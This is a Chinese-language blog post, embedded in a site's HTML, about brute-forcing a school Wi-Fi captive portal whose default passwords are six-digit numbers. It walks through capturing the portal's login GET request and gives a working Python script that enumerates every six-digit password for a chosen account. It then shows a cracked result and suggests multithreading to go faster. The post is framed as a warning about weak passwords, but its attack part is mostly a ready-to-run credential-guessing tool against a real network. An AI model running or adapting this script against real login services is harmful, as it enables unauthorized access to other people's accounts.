@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    python脚本-暴力破解无线网弱密码 |  の
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="の" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-python脚本-暴力破解无线网弱密码"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  python脚本-暴力破解无线网弱密码
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/04/26/python%E8%84%9A%E6%9C%AC-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%97%A0%E7%BA%BF%E7%BD%91%E5%BC%B1%E5%AF%86%E7%A0%81/" class="article-date">
+  <time datetime="2019-04-25T16:00:00.000Z" itemprop="datePublished">2019-04-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">948</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">4 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p><strong>背景：学校最近重新架设无线网一体化，而初始密码为弱密码（6位数字），下面我们要做的就是通过暴力破解的方式破解弱密码！（所以建议大家以后无论是在注册还是什么情况，都千万不要使用弱密钥）</strong></p>
+<a id="more"></a>
+<p><strong>攻击过程如下：</strong></p>
+<h2 id="1-获取get参数"><a href="#1-获取get参数" class="headerlink" title="1.获取get参数"></a>1.获取get参数</h2><p><strong>在爆破之前我们需要获取一些get参数，这些参数应该包含着我们输入的登陆信息。</strong></p>
+<p>登陆无线网前需要在网页上进行身份验证。<br><img src="https://s2.ax1x.com/2019/04/26/Eni5OU.png" alt="验证界面"><br>随便输入一个账号密码，看返回结果是什么。比如输入学号：1122，密码：1231131，运营商选择联通。提示无账号，但是无所谓，毕竟我们的目的在于接下来的抓包环节。抓包看看get的网址，选择我们有用的，比如下图中get参数中包含了我们输入的信息。这很有用，因为这为我们下面的python脚本提供了url。<br><img src="https://s2.ax1x.com/2019/04/26/EniomF.png" alt="获取输入的get参数"><br>看一下回显结果，提示<code>&quot;result&quot;:&quot;0&quot;</code>等信息。<br><img src="https://s2.ax1x.com/2019/04/26/EniTw4.png" alt="验证失败回显内容"><br>我们再输入一个正确的账号密码，将get参数中的user_account和user_password换成正确的（我自己的无线网认证账号密码，账号和密码就不公布了hhhhh），看一下正确登陆后的回显内容。显示<code>&quot;result&quot;:&quot;1&quot;,&quot;认证成功&quot;</code>等信息。<br><img src="https://s2.ax1x.com/2019/04/26/Eni7TJ.png" alt="验证正确回显内容"><br>ok，我们可以根据回显内容的不同来判断是否验证成功。下面就可以进行暴力破解了，只需要选定一个存在的账号，然后穷举6位数字密码的所有可能性，一一验证即可。</p>
+<h2 id="python脚本暴力破解"><a href="#python脚本暴力破解" class="headerlink" title="python脚本暴力破解"></a>python脚本暴力破解</h2><p>直接上代码吧：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from time import strftime</span><br><span class="line">from itertools import product</span><br><span class="line">from time import sleep</span><br><span class="line">import requests</span><br><span class="line">from requests import post</span><br><span class="line">import re</span><br><span class="line">import threading    #可开启多线程</span><br><span class="line">import time</span><br><span class="line"> </span><br><span class="line">def fx(iter&#x3D;[&#39;0123456789&#39;]):</span><br><span class="line">  def psgen(x):    #密码生成器，穷举所有的密码可能性，参数x表示密码长度</span><br><span class="line">    for r in iter:</span><br><span class="line">      for repeat in range(x,x+1):</span><br><span class="line">        for ps in product(r,repeat&#x3D;repeat):</span><br><span class="line">          yield &#39;&#39;.join(ps)</span><br><span class="line">  for ps in psgen(6):</span><br><span class="line">    url&#x3D;&#39;http:&#x2F;&#x2F;10.2.5.251:801&#x2F;eportal&#x2F;?c&#x3D;Portal&amp;a&#x3D;login&amp;callback&#x3D;dr1556270398016&amp;login_method&#x3D;1&amp;user_account&#x3D;08xxxx05@unicom&amp;user_password&#x3D;%s&amp;wlan_user_ip&#x3D;10.3.37.27&amp;wlan_user_mac&#x3D;d07e351e9bbe&amp;wlan_ac_ip&#x3D;&amp;wlan_ac_name&#x3D;NAS&amp;jsVersion&#x3D;3.0&amp;_&#x3D;1556270388759&#39;%ps</span><br><span class="line">    try:</span><br><span class="line">      s&#x3D;requests.session()</span><br><span class="line">      rs&#x3D;s.get(url).content.decode(&#39;utf-8&#39;)</span><br><span class="line">      r &#x3D; re.findall(r&#39;认证成功&#39;,rs)        #判断验证结果</span><br><span class="line">      if r: </span><br><span class="line">        with open(&quot;resut.csv&quot;,&quot;a+&quot;) as f:    #存储密码结果到result.csv文件中</span><br><span class="line">          f.write(&#39;密码破解成功结果为：,&#39;+ ps + &#39;,&#39; + strftime(&quot;%c&quot;) + &#39;,&#39; + url+&#39;\n&#39;)</span><br><span class="line">        print(&#39;密码破解成功：&#39;+ps+&#39; ,&#39;+rs)</span><br><span class="line">        break</span><br><span class="line">      else:</span><br><span class="line">        print(ps+&#39;密码不正确&#39;+rs)</span><br><span class="line">    except:</span><br><span class="line">      sleep(1)</span><br><span class="line">      pass</span><br><span class="line">      </span><br><span class="line">fx([&#39;0123456789&#39;])</span><br></pre></td></tr></table></figure>
+<p>接下来运行等待结果就ok了。看一下运行过程图：<br><img src="https://s2.ax1x.com/2019/04/26/Enibk9.png" alt="暴力破解过程图"><br>由于一共的可能性有1000000种，而且每一次穷举都要进行一次网络验证，即每一次验证都有网络延时，所以要等上一会儿。大概爆破了一个多小时，终于爆出了正确结果。生成了result.csv文件，查看一下文件内容，如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密码破解成功结果为：,15xxxx,Fri Apr 26 17:28:19 2019,http:&#x2F;&#x2F;10.2.5.251:801&#x2F;eportal&#x2F;?c&#x3D;Portal&amp;a&#x3D;login&amp;callback&#x3D;dr1556270398016&amp;login_method&#x3D;1&amp;user_account&#x3D;08xxxx05@unicom&amp;user_password&#x3D;15xxxx&amp;wlan_user_ip&#x3D;10.3.37.27&amp;wlan_user_mac&#x3D;d07e351e9bbe&amp;wlan_ac_ip&#x3D;&amp;wlan_ac_name&#x3D;NAS&amp;jsVersion&#x3D;3.0&amp;_&#x3D;1556270388759</span><br></pre></td></tr></table></figure>
+<p><strong>速度慢可以开启多线程，同时进行测试。结果好很多！</strong></p>
+<h4 id="爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！"><a href="#爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！" class="headerlink" title="爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！"></a>爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！</h4> 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          Donate
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAT4AAAE+CAAAAAAxUyPsAAAFJ0lEQVR42u3aQW7jWhADwLn/pfOBvx3YIZtyZpHyKkgcWSoZEB/7/fkTv77+ev391/f/1R7n68UrOc6rs7od54EXPnz48OHD95bm1cckx7kx5UdebsPC+pIYHz58+PDhO/HdOL5Or/eXkRAvEer9VeQm+PDhw4cP38/ztWHiRna7PXkAyuMUPnz48OHD95N8SYjJb0NeGSzQyc37oeCCDx8+fPjwlWX9bbx9W/a/P0L+nrby+OCsAx8+fPjw4St3Yf2enz+yvw8fPnz48P16vmXInRyzrd1vYeK2Pe6BYT8+fPjw4cN3cmiX3C3ZMpZug1Q7IL8V/fjw4cOHD9/Cd4sg+Qi8jRrtOr0dbOexKRkt4MOHDx8+fDnfLTrcxsZJ9Hk2cCQcSwjDhw8fPnz4bivctrZu37kU4vkWt3ypf/vEonHBhw8fPnz4XvycVAB51X674DziJBFkL+6Ts8KHDx8+fPhufPvjP18758v+dgywbzK7fRXw4cOHDx++G1+7gWw/0bw6b+v1fHB+20dQF/f48OHDhw9fOTLfl+h7WZ8M0Z8qAtpBPj58+PDhw5fz5YPhfCNXWwQsm9Vu/5vEpiRs4cOHDx8+fC3f7ZHforRlffK5S+F+Kzi++Q7iw4cPHz58A1+xPSuu8vMn/i2aLCVIW0Dgw4cPHz58N752kb+MmW9BIR+Ht1vK9vPHhw8fPnz4bnztgjynvL1nKdPb39+Ojw8fPnz48H2OLy/E27jTlul5TFlq+uKz8OHDhw8fvof4cqzkkZ/HnVuhn4PeyoJiGoAPHz58+PCdTm4fKidkt+CS35g93BRlPT58+PDhw5c+3+vH9q0s2INCG3SWaFVs0cOHDx8+fPhKvtvo+nYZyTHbALEM+JcNcPjw4cOHD9+Nry249+F0XkAsg/y8qrhdLz58+PDhw3fjW4LLUwvyNkDkA/K8dPgHuQ8fPnz48P1KvlsdkC/sbxX/Xt/fEPMvFj58+PDhw/cJvvwil9yUbCbLS/Zl01ud+PDhw4cPH74TX7I4z1mT3+T0be3esk5bBPDhw4cPH77TM/d2cnvsSM5nGYTfbluxvwAfPnz48OGb+fJl+TImv216WwYMSUApxvD48OHDhw/fiW95/LfL9fb25Iv5W9BZ6gZ8+PDhw4fvdD51fb+MvdsR9T4MaGPKsokNHz58+PDhW+Ceiiz7LbmVFMsxb18afPjw4cOH7/0Z7qPuW1xYRum3zWRLwHp5bvjw4cOHD9+pZ35sbBzX9EllcAtDy41vRwj48OHDhw9fy/c+IuQB4tmhdX472/jVHvMbYnz48OHDh6/kax/bbdyJ5gPxmeQL/hxiiV/48OHDhw9fy/eJiPDUbcgj1F7W5xv1jl0LPnz48OHDNw+26w84xaM2GC3D/vx68eHDhw8fvmf5WoL25HLEG257A27XhQ8fPnz48LV8ywg5rwPyEjz/r/bm3SYY35wDPnz48OHDd+JrL6B9zCd1/LOvPYRF78SHDx8+fPhmvluwSOr4vP6+1QdtoZAf/+X14sOHDx8+fJfrLaLAU6e4/5wUE3nA2s8BHz58+PDhy4/WhpWk5s4vcvl9vnnuc5+LDx8+fPjw3fie2nCWsy6L8KeG6Lfohg8fPnz48P0MXx4U3hcN7QW3ty2PL+078eHDhw8fvp/kaxf/yyawtoLPb8My7MeHDx8+fPie4ruV9TnTcrQkduRA+23Ahw8fPnz4Fr5bpLjBLZFlKRr2QLOMFvDhw4cPH77/X/8Bmxc2xfMuhkcAAAAASUVORK5CYII=" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2019/12/26/linux%E9%85%8D%E7%BD%AEnginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            linux配置nginx反向代理
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/03/31/%E5%88%A9%E7%94%A8docker%E5%B0%86web%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">利用docker将web项目部署到服务器</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "ds54farWshFsUraKxWRVVf4G-gzGzoHsz",
+    app_key: "q4rgias5HDeq09ugweytekJQ",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2018-2023
+        <i class="ri-heart-fill heart_icon"></i> Supervampire
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="https://beian.miit.gov.cn/#/Integrated/recordQuery" target="_black" rel="nofollow">苏ICP备2022035104号-1</a>
+        </li>
+        
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/ayer-side.svg" alt="の"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://wxt123.top/downloads/">云盘</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210117222926.png">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210117222736.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=22707008&auto=1&height=66"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+  </div>
+</body>
+
+</html>
